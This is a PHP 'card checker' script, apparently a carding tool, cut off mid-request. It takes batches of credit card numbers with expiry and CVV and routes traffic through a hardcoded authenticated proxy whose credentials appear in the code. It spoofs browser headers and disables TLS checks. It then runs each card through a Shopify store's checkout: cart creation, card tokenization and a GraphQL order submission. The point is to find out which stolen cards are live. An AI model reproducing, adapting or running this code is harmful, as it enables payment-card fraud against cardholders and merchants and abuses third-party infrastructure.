<?php
session_start();
// Turn off output buffering
@ob_end_flush();
@ini_set('output_buffering', 'off');
@ini_set('zlib.output_compression', false);
// header('Content-Encoding: none');
@ini_set('implicit_flush', true);
while (ob_get_level()) ob_end_clean();
ob_implicit_flush(true);

require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

// Important functions start
function find_between($content, $start, $end)
{
    $startPos = strpos($content, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($content, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($content, $startPos, $endPos - $startPos);
}

$proxy_list_str = '
51.159.85.23:6060:dljy1unah6650fl:a73sccespoqpbjo';

$proxies = explode("\n", $proxy_list_str);
$proxy_array = [];

foreach ($proxies as $proxy_line) {
    $proxy_line = trim($proxy_line);
    if (empty($proxy_line)) continue;
    $parts = explode(':', $proxy_line);
    $ip = $parts[0] ?? '';
    $port = $parts[1] ?? '';
    $username = $parts[2] ?? '';
    $password = $parts[3] ?? '';

    $proxy_array[] = [
        'ip' => $ip,
        'port' => $port,
        'username' => $username,
        'password' => $password,
    ];
}

// Function to process GET request with lista parameter
function process_get_request() {
    if (isset($_GET['lista'])) {
        $lista = $_GET['lista'];
        // Check if multiple cards are separated by commas or newlines
        if (strpos($lista, ',') !== false) {
            $cc_lines = explode(',', $lista);
        } elseif (strpos($lista, '\n') !== false) {
            $cc_lines = explode('\n', $lista);
        } else {
            $cc_lines = [$lista];
        }
        
        return array_map('trim', $cc_lines);
    }
    return [];
}

// Function to process POST request with cc_input
function process_post_request() {
    if (isset($_POST['cc_input'])) {
        $cc_input = $_POST['cc_input'];
        $cc_lines = explode("\n", $cc_input);
        return array_map('trim', $cc_lines);
    }
    return [];
}

// Check if we have GET or POST input
$cc_lines = process_get_request();
if (empty($cc_lines)) {
    $cc_lines = process_post_request();
}

// If no input, display the form
if (empty($cc_lines)) {
    echo '
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap");
        body {
            font-family: "Poppins", sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 2.5rem;
            color: #333;
            margin-bottom: 1.5rem;
        }
        textarea {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: 2px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            border-color: #4CAF50;
            outline: none;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease, transform 0.1s ease;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        input[type="submit"]:active {
            transform: scale(0.98);
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        .error {
            color: red;
            margin-top: 1rem;
        }
    </style>
    <div class="container fade-in">
        <h1>Mod By Goku</h1>
        <form method="post">
            <textarea name="cc_input" rows="10" cols="50" placeholder="Enter CC details (max 10 cards, one per line)"></textarea><br>
            <input type="submit" value="Start Checking">
        </form>
    </div>';
    exit;
}

// Check if more than 10 cards are entered
if (count($cc_lines) >= 100) {
    echo '
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap");
        body {
            font-family: "Poppins", sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 2.5rem;
            color: #333;
            margin-bottom: 1.5rem;
        }
        textarea {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: 2px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            border-color: #4CAF50;
            outline: none;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease, transform 0.1s ease;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        input[type="submit"]:active {
            transform: scale(0.98);
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        .error {
            color: red;
            margin-top: 1rem;
        }
    </style>
    <div class="container fade-in">
        <h1>Mod By Goku</h1>
        <p class="error">Error: You can only enter max 10 cards. Please try again.</p>
        <form method="post">
            <textarea name="cc_input" rows="10" cols="50" placeholder="Enter CC details (max 10 cards, one per line)"></textarea><br>
            <input type="submit" value="Start Checking">
        </form>
    </div>';
    exit;
}

// Loop through each cc
foreach ($cc_lines as $cc_line) {
    $cc1 = trim($cc_line);
    // Now the rest of the code uses $cc1

    if (empty($cc1)) {
        echo json_encode([
            'Error' => 'True',
            'Message' => 'Please enter card details',
            'Owner' => '⚡⚡ @mhitzxg ⚡⚡',
        ]);
        // Flush output after each card
        echo str_repeat(' ', 1024);
        flush();
        continue;
    }

    $cc_partes = explode("|", $cc1);
    $cc = $cc_partes[0];
    $month = $cc_partes[1];
    $year = $cc_partes[2];
    $cvv = $cc_partes[3];

    /*=====  sub_month  ======*/
    $yearcont = strlen($year);
    if ($yearcont <= 2) {
        $year = "20$year";
    }

    $sub_month = ltrim($month, '0');

    if ($sub_month == "") {
        $sub_month = $month;
    }

    // Proceed with other operations

    // The variables that may be uninitialized
    $err = '';
    $response = '';
    $checkouturl = '';
    $headers = [];
    $x_checkout_one_session_token = '';
    $queue_token = '';
    $stable_id = '';
    $paymentMethodIdentifier = '';
    $cctoken = '';
    $recipt_id = '';

    $urlbase = 'https://blackmp.life/';
    $domain = 'blackmp.life';
    $cookie = 'cookie.txt';
    
    $proxy = $proxy_array[array_rand($proxy_array)];

    // Enhanced debugging
    $debug_info = [];

    // Start of try-catch to handle exceptions
    try {
        echo "<pre>🔍 Starting checkout process for: $cc|$sub_month|$year|$cvv</pre>";
        flush();

        // First cURL request
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/42721297924198:1');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'priority: u=0, i',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: '.$ua,
        ]);
        
        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

        $headers = [];
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
            $parts = explode(':', $headerLine, 2);
            if (count($parts) < 2) return strlen($headerLine);
            $name = trim($parts[0]);
            $value = trim($parts[1]);

            // Save the 'Location' header
            if (strtolower($name) === 'location') {
                $headers['Location'] = $value;
            }

            return strlen($headerLine);
        });
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $debug_info['step1_http_code'] = $http_code;
        $debug_info['step1_response_length'] = strlen($response);

        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            curl_close($ch);
            throw new Exception($err);
        }
        
        if ($http_code != 200 && $http_code != 302) {
            $err = "HTTP Error: $http_code";
            curl_close($ch);
            throw new Exception($err);
        }
        
        if (preg_match('/out of stock/i', $response)) {
            $err = 'Product is out of stock';
            curl_close($ch);
            throw new Exception($err);
        }
        curl_close($ch);

        $checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
        $checkoutToken = '';
        if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
            $checkoutToken = $matches[1];
        }
        
        $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
        if (empty($x_checkout_one_session_token)) {
            // Try alternative extraction method
            $x_checkout_one_session_token = find_between($response, 'sessionToken&quot;:&quot;', '&quot;');
        }
        
        if (empty($x_checkout_one_session_token)) {
            $err = "Session token is empty - Check if site is accessible";
            $debug_info['step1_response_sample'] = substr($response, 0, 500);
            throw new Exception($err);
        }
        
        $queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
        if (empty($queue_token)) {
            $err = 'Queue Token is empty';
            throw new Exception($err);
        }
        
        $stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
        if (empty($stable_id)) {
            $err = 'Stable id is empty';
            throw new Exception($err);
        }
        
        $paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
        if (empty($paymentMethodIdentifier)) {
            $err = 'Payment Method Identifier Token is empty';
            throw new Exception($err);
        }

        echo "<pre>✅ Step 1 Complete - Session: " . substr($x_checkout_one_session_token, 0, 20) . "...</pre>";
        flush();

        // Second cURL request (card)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/json',
            'origin: https://checkout.shopifycs.com',
            'priority: u=1, i',
            'referer: https://checkout.shopifycs.com/',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-site',
            'user-agent: '.$ua,
        ]);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"insane xd"},"payment_session_scope":"'.$domain.'"}');
        
        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        
        $response2 = curl_exec($ch);
        $http_code2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $debug_info['step2_http_code'] = $http_code2;
        $debug_info['step2_response'] = $response2;

        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            curl_close($ch);
            throw new Exception($err);
        }
        
        $response2js = json_decode($response2, true);
        $cctoken = $response2js['id'] ?? '';
        
        if (empty($cctoken)) {
            $error_msg = $response2js['message'] ?? 'Unknown error in card tokenization';
            $err  = 'Card Token failed: ' . $error_msg;
            curl_close($ch);
            throw new Exception($err);
        }
        curl_close($ch);

        echo "<pre>✅ Step 2 Complete - Card Token: " . substr($cctoken, 0, 20) . "...</pre>";
        flush();

        // Third cURL request (receipt) - Enhanced with better error handling
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: en-US',
            'content-type: application/json',
            'origin: '.$urlbase,
            'priority: u=1, i',
            'referer: '.$urlbase.'/',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: '.$ua,
            'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
            'x-checkout-web-deploy-stage: production',
            'x-checkout-web-server-handling: fast',
            'x-checkout-web-server-rendering: no',
            'x-checkout-web-source-id: ' . $checkoutToken,
        ]);

        $postf = json_encode([
            'query' => 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
            'variables' => [
                'input' => [
                'sessionInput' => [
